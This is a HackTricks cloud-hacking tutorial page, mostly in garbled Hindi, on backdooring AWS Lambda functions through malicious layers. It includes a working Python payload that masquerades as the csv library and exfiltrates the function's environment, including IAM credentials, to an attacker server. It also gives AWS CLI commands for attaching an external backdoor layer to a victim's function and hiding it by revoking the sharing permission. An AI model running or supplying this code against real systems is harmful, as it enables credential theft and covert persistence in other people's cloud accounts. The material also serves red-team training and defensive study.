# AWS - Lambda Layers Persistence

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Lambda Layers

рдПрдХ Lambda рд▓реЗрдпрд░ рдПрдХ .zip рдлрд╝рд╛рдЗрд▓ рд╕рдВрдЧреНрд░рд╣ рд╣реИ рдЬреЛ **рдЕрддрд┐рд░рд┐рдХреНрдд рдХреЛрдб** рдпрд╛ рдЕрдиреНрдп рд╕рд╛рдордЧреНрд░реА **рд╢рд╛рдорд┐рд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред рдПрдХ рд▓реЗрдпрд░ рдореЗрдВ рдкреБрд╕реНрддрдХрд╛рд▓рдп, рдПрдХ [рдХрд╕реНрдЯрдо рд░рдирдЯрд╛рдЗрдо](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-custom.html), рдбреЗрдЯрд╛, рдпрд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реЛ рд╕рдХрддреА рд╣реИрдВред

рдЖрдк **рдкреНрд░рддреНрдпреЗрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдкрд╛рдВрдЪ рд▓реЗрдпрд░** рддрдХ рд╢рд╛рдорд┐рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЬрдм рдЖрдк рдХрд┐рд╕реА рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ рдПрдХ рд▓реЗрдпрд░ рд╢рд╛рдорд┐рд▓ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ **рд╕рд╛рдордЧреНрд░реА рдХреЛ `/opt`** рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрди рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдирд┐рдХрд╛рд▓рд╛ рдЬрд╛рддрд╛ рд╣реИред

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ**, рдЬреЛ **рд▓реЗрдпрд░** рдЖрдк рдмрдирд╛рддреЗ рд╣реИрдВ рд╡реЗ рдЖрдкрдХреЗ AWS рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдП **рдирд┐рдЬреА** рд╣реЛрддреА рд╣реИрдВред рдЖрдк рдПрдХ рд▓реЗрдпрд░ рдХреЛ рдЕрдиреНрдп рдЦрд╛рддреЛрдВ рдХреЗ рд╕рд╛рде **рд╕рд╛рдЭрд╛** рдХрд░рдиреЗ рдпрд╛ рд▓реЗрдпрд░ рдХреЛ **рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ** рдмрдирд╛рдиреЗ рдХрд╛ рд╡рд┐рдХрд▓реНрдк рдЪреБрди рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдЖрдкрдХреЗ рдлрд╝рдВрдХреНрд╢рди рдХрд┐рд╕реА рдЕрдиреНрдп рдЦрд╛рддреЗ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХреА рдЧрдИ рд▓реЗрдпрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЗ рдлрд╝рдВрдХреНрд╢рди **рд▓реЗрдпрд░ рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдЬрд╛рд░реА рд░рдЦ рд╕рдХрддреЗ рд╣реИрдВ, рднрд▓реЗ рд╣реА рдЗрд╕реЗ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ, рдпрд╛ рдЖрдкрдХреЗ рд▓реЗрдпрд░ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдХреЛ рд░рджреНрдж рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ**ред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдЖрдк рдПрдХ рдирдИ рдлрд╝рдВрдХреНрд╢рди рдирд╣реАрдВ рдмрдирд╛ рд╕рдХрддреЗ рдпрд╛ рд╣рдЯрд╛рдИ рдЧрдИ рд▓реЗрдпрд░ рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╝рдВрдХреНрд╢рдВрд╕ рдХреЛ рдЕрдкрдбреЗрдЯ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗред

рдХрдВрдЯреЗрдирд░ рдЫрд╡рд┐ рдХреЗ рд░реВрдк рдореЗрдВ рддреИрдирд╛рдд рдлрд╝рдВрдХреНрд╢рди рд▓реЗрдпрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдмрдЬрд╛рдп, рдЖрдк рдЫрд╡рд┐ рдмрдирд╛рдиреЗ рдХреЗ рд╕рдордп рдЕрдкрдиреЗ рдкрд╕рдВрджреАрджрд╛ рд░рдирдЯрд╛рдЗрдо, рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдФрд░ рдЕрдиреНрдп рдирд┐рд░реНрднрд░рддрд╛рдУрдВ рдХреЛ рдХрдВрдЯреЗрдирд░ рдЫрд╡рд┐ рдореЗрдВ рдкреИрдХреЗрдЬ рдХрд░рддреЗ рд╣реИрдВред

### Python load path

Python рджреНрд╡рд╛рд░рд╛ lambda рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рд▓реЛрдб рдкрде рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реИ:
```
['/var/task', '/opt/python/lib/python3.9/site-packages', '/opt/python', '/var/runtime', '/var/lang/lib/python39.zip', '/var/lang/lib/python3.9', '/var/lang/lib/python3.9/lib-dynload', '/var/lang/lib/python3.9/site-packages', '/opt/python/lib/python3.9/site-packages']
```
Check how the **second** and third **positions** are occupy by directories where **lambda layers** uncompress their files: **`/opt/python/lib/python3.9/site-packages`** and **`/opt/python`**

{% hint style="danger" %}
рдпрджрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдиреЗ рдПрдХ рдЙрдкрдпреЛрдЧ рдХреА рдЧрдИ lambda **layer** рдореЗрдВ **backdoor** рдбрд╛рд▓рдиреЗ рдореЗрдВ рд╕рдлрд▓рддрд╛ рдкреНрд░рд╛рдкреНрдд рдХреА рдпрд╛ рдПрдХ рдРрд╕рд╛ **layer** рдЬреЛ **рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рд╣реЛрдиреЗ рдкрд░ рдордирдорд╛рдирд╛ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛** рдЬреЛрдбрд╝ рджрд┐рдпрд╛, рддреЛ рд╡рд╣ рдкреНрд░рддреНрдпреЗрдХ lambda рдХреЙрд▓ рдХреЗ рд╕рд╛рде рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛ред
{% endhint %}

Therefore, the requisites are:

* **Check libraries** that are **loaded** by the victims code
* Create a **proxy library with lambda layers** that will **execute custom code** and **load the original** library.

### Preloaded libraries

{% hint style="warning" %}
рдЬрдм рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп рдореИрдВрдиреЗ рдПрдХ рдХрдард┐рдирд╛рдИ рдкрд╛рдИ: рдХреБрдЫ рдкреБрд╕реНрддрдХрд╛рд▓рдп **рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд▓реЛрдб** рд╣реЛрддреЗ рд╣реИрдВ рдЬрдм рдЖрдкрдХрд╛ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИред рдореИрдВ `os` рдпрд╛ `sys` рдЬреИрд╕реА рдЪреАрдЬреЗрдВ рдЦреЛрдЬрдиреЗ рдХреА рдЙрдореНрдореАрдж рдХрд░ рд░рд╣рд╛ рдерд╛, рд▓реЗрдХрд┐рди **рдпрд╣рд╛рдВ рддрдХ рдХрд┐ `json` рдкреБрд╕реНрддрдХрд╛рд▓рдп рднреА рд▓реЛрдб рд╣реЛ рдЪреБрдХрд╛ рдерд╛**ред\
рдЗрд╕ рд╕реНрдерд╛рдпреА рддрдХрдиреАрдХ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдХреЛрдб рдХреЛ **рдПрдХ рдирдпрд╛ рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдЬреЛ рд▓реЛрдб рдирд╣реАрдВ рд╣реЛрддрд╛** рдЬрдм рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИред
{% endhint %}

With a python code like this one it's possible to obtain the **list of libraries that are pre loaded** inside python runtime in lambda:
```python
import sys

def lambda_handler(event, context):
return {
'statusCode': 200,
'body': str(sys.modules.keys())
}
```
рдФрд░ рдпрд╣ **рд╕реВрдЪреА** рд╣реИ (рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ `os` рдпрд╛ `json` рдЬреИрд╕реА рдкреБрд╕реНрддрдХрд╛рд▓рдп рдкрд╣рд▓реЗ рд╕реЗ рдореМрдЬреВрдж рд╣реИрдВ)
```
'sys', 'builtins', '_frozen_importlib', '_imp', '_thread', '_warnings', '_weakref', '_io', 'marshal', 'posix', '_frozen_importlib_external', 'time', 'zipimport', '_codecs', 'codecs', 'encodings.aliases', 'encodings', 'encodings.utf_8', '_signal', 'encodings.latin_1', '_abc', 'abc', 'io', '__main__', '_stat', 'stat', '_collections_abc', 'genericpath', 'posixpath', 'os.path', 'os', '_sitebuiltins', 'pwd', '_locale', '_bootlocale', 'site', 'types', 'enum', '_sre', 'sre_constants', 'sre_parse', 'sre_compile', '_heapq', 'heapq', 'itertools', 'keyword', '_operator', 'operator', 'reprlib', '_collections', 'collections', '_functools', 'functools', 'copyreg', 're', '_json', 'json.scanner', 'json.decoder', 'json.encoder', 'json', 'token', 'tokenize', 'linecache', 'traceback', 'warnings', '_weakrefset', 'weakref', 'collections.abc', '_string', 'string', 'threading', 'atexit', 'logging', 'awslambdaric', 'importlib._bootstrap', 'importlib._bootstrap_external', 'importlib', 'awslambdaric.lambda_context', 'http', 'email', 'email.errors', 'binascii', 'email.quoprimime', '_struct', 'struct', 'base64', 'email.base64mime', 'quopri', 'email.encoders', 'email.charset', 'email.header', 'math', '_bisect', 'bisect', '_random', '_sha512', 'random', '_socket', 'select', 'selectors', 'errno', 'array', 'socket', '_datetime', 'datetime', 'urllib', 'urllib.parse', 'locale', 'calendar', 'email._parseaddr', 'email.utils', 'email._policybase', 'email.feedparser', 'email.parser', 'uu', 'email._encoded_words', 'email.iterators', 'email.message', '_ssl', 'ssl', 'http.client', 'runtime_client', 'numbers', '_decimal', 'decimal', '__future__', 'simplejson.errors', 'simplejson.raw_json', 'simplejson.compat', 'simplejson._speedups', 'simplejson.scanner', 'simplejson.decoder', 'simplejson.encoder', 'simplejson', 'awslambdaric.lambda_runtime_exception', 'awslambdaric.lambda_runtime_marshaller', 'awslambdaric.lambda_runtime_client', 'awslambdaric.bootstrap', 'awslambdaric.__main__', 'lambda_function'
```
рдФрд░ рдпрд╣ **рд▓рд╛рдЗрдмреНрд░реЗрд░реАрдЬрд╝** рдХреА рд╕реВрдЪреА рд╣реИ рдЬреЛ **рд▓реИрдореНрдмреНрдбрд╛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ**: [https://gist.github.com/gene1wood/4a052f39490fae00e0c3](https://gist.github.com/gene1wood/4a052f39490fae00e0c3)

### рд▓реИрдореНрдмреНрдбрд╛ рд▓реЗрдпрд░ рдмреИрдХрдбреЛрд░рд┐рдВрдЧ

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдорд╛рди рд▓реАрдЬрд┐рдП рдХрд┐ рд▓рдХреНрд╖рд┐рдд рдХреЛрдб **`csv`** рдЖрдпрд╛рдд рдХрд░ рд░рд╣рд╛ рд╣реИред рд╣рдо **`csv` рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЗ рдЖрдпрд╛рдд рдореЗрдВ рдмреИрдХрдбреЛрд░рд┐рдВрдЧ** рдХрд░рдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВред

рдЗрд╕рдХреЗ рд▓рд┐рдП, рд╣рдо **`/opt/python/lib/python3.9/site-packages`** рдореЗрдВ **`csv`** рдирд╛рдо рдХрд╛ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдмрдирд╛рдПрдВрдЧреЗ рдЬрд┐рд╕рдореЗрдВ рдлрд╝рд╛рдЗрд▓ **`__init__.py`** рд╣реЛрдЧреАред\
рдлрд┐рд░, рдЬрдм рд▓реИрдореНрдмреНрдбрд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛ рдФрд░ **csv** рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛, рддреЛ рд╣рдорд╛рд░реА **`__init__.py` рдлрд╝рд╛рдЗрд▓ рд▓реЛрдб рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧреА**ред\
рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП:

* рд╣рдорд╛рд░реЗ рдкреЗрд▓реЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ
* рдореВрд▓ csv рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЛ рд▓реЛрдб рдХрд░реЗрдВ

рд╣рдо рджреЛрдиреЛрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
import sys
from urllib import request

with open("/proc/self/environ", "rb") as file:
url= "https://attacker13123344.com/" #Change this to your server
req = request.Request(url, data=file.read(), method="POST")
response = request.urlopen(req)

# Remove backdoor directory from path to load original library
del_path_dir = "/".join(__file__.split("/")[:-2])
sys.path.remove(del_path_dir)

# Remove backdoored loaded library from sys.modules
del sys.modules[__file__.split("/")[-2]]

# Load original library
import csv as _csv

sys.modules["csv"] = _csv
```
рдлрд┐рд░, рдЗрд╕ рдХреЛрдб рдХреЗ рд╕рд╛рде рдПрдХ рдЬрд╝рд┐рдк рдмрдирд╛рдПрдВ рдЬреЛ рдкрде **`python/lib/python3.9/site-packages/__init__.py`** рдореЗрдВ рд╣реЛ рдФрд░ рдЗрд╕реЗ рдПрдХ рд▓реИрдореНрдмреНрдбрд╛ рд▓реЗрдпрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдЬреЛрдбрд╝реЗрдВред

рдЖрдк рдЗрд╕ рдХреЛрдб рдХреЛ [**https://github.com/carlospolop/LambdaLayerBackdoor**](https://github.com/carlospolop/LambdaLayerBackdoor) рдкрд░ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдПрдХреАрдХреГрдд рдкреЗрд▓реЛрдб **IAM рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдПрдХ рд╕рд░реНрд╡рд░ рдкрд░ рднреЗрдЬреЗрдЧрд╛ рдЬрдм рдЗрд╕реЗ рдкрд╣рд▓реА рдмрд╛рд░ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдпрд╛ рд▓реИрдореНрдмреНрдбрд╛ рдХрдВрдЯреЗрдирд░ рдХреЗ рд░реАрд╕реЗрдЯ рдХреЗ рдмрд╛рдж** (рдХреЛрдб рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрди рдпрд╛ рдардВрдбреА рд▓реИрдореНрдмреНрдбрд╛), рд▓реЗрдХрд┐рди **рдЕрдиреНрдп рддрдХрдиреАрдХреЗрдВ** рдЬреИрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рднреА рдПрдХреАрдХреГрдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ:

{% content-ref url="../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

### рдмрд╛рд╣рд░реА рд▓реЗрдпрд░реНрд╕

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдмрд╛рд╣рд░реА рдЦрд╛рддреЛрдВ рд╕реЗ рд▓реИрдореНрдмреНрдбрд╛ рд▓реЗрдпрд░реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ**ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдПрдХ рд▓реИрдореНрдмреНрдбрд╛ рдПрдХ рдмрд╛рд╣рд░реА рдЦрд╛рддреЗ рд╕реЗ рдПрдХ рд▓реЗрдпрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рднрд▓реЗ рд╣реА рдЙрд╕рдХреЗ рдкрд╛рд╕ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рди рд╣реЛрдВред\
рдпрд╣ рднреА рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдПрдХ рд▓реИрдореНрдмреНрдбрд╛ рдХреЗ рдкрд╛рд╕ рдЕрдзрд┐рдХрддрдо 5 рд▓реЗрдпрд░реНрд╕ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ**ред

рдЗрд╕рд▓рд┐рдП, рдЗрд╕ рддрдХрдиреАрдХ рдХреА рдмрд╣реБрдкрд░рдХрд╛рд░реАрддрд╛ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:

* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдПрдХ рдореМрдЬреВрджрд╛ рд▓реЗрдпрд░ рдореЗрдВ рдмреИрдХрдбреЛрд░ рдбрд╛рд▓реЗрдВ (рдХреБрдЫ рднреА рдмрд╛рд╣рд░реА рдирд╣реАрдВ рд╣реИ)
* **рдЕрдкрдиреЗ рдЦрд╛рддреЗ рдореЗрдВ** рдПрдХ **рд▓реЗрдпрд░** **рдмрдирд╛рдПрдВ**, **рдкреАрдбрд╝рд┐рдд рдЦрд╛рддреЗ рдХреЛ рд▓реЗрдпрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рджреЗрдВ**, **рдкреАрдбрд╝рд┐рдд рдХреЗ рд▓реИрдореНрдмреНрдбрд╛ рдореЗрдВ рд▓реЗрдпрд░ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ** рдФрд░ **рдЕрдиреБрдорддрд┐ рд╣рдЯрд╛ рджреЗрдВ**ред
* **рд▓реИрдореНрдмреНрдбрд╛** рдЕрднреА рднреА **рд▓реЗрдпрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛** рдФрд░ **рдкреАрдбрд╝рд┐рдд** рдХреЗ рдкрд╛рд╕ **рд▓реЗрдпрд░реНрд╕ рдХреЛрдб рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдХреЛрдИ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рдирд╣реАрдВ рд╣реЛрдЧрд╛** (рд▓реИрдореНрдмреНрдбрд╛ рдХреЗ рдЕрдВрджрд░ рдПрдХ рд░рд┐рд╡ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдЕрд▓рд╛рд╡рд╛)
* рдкреАрдбрд╝рд┐рдд **`aws lambda list-layers`** рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХреА рдЧрдИ рдмрд╛рд╣рд░реА рд▓реЗрдпрд░реНрд╕ рдирд╣реАрдВ рджреЗрдЦреЗрдЧрд╛ред

{% code overflow="wrap" %}
```bash
# Upload backdoor layer
aws lambda publish-layer-version --layer-name "ExternalBackdoor" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"

# Give everyone access to the lambda layer
## Put the account number in --principal to give access only to an account
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion

## Add layer to victims Lambda

# Remove permissions
aws lambda remove-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1
```
{% endcode %}

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **рд╣рдорд╛рд░рд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ** **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}
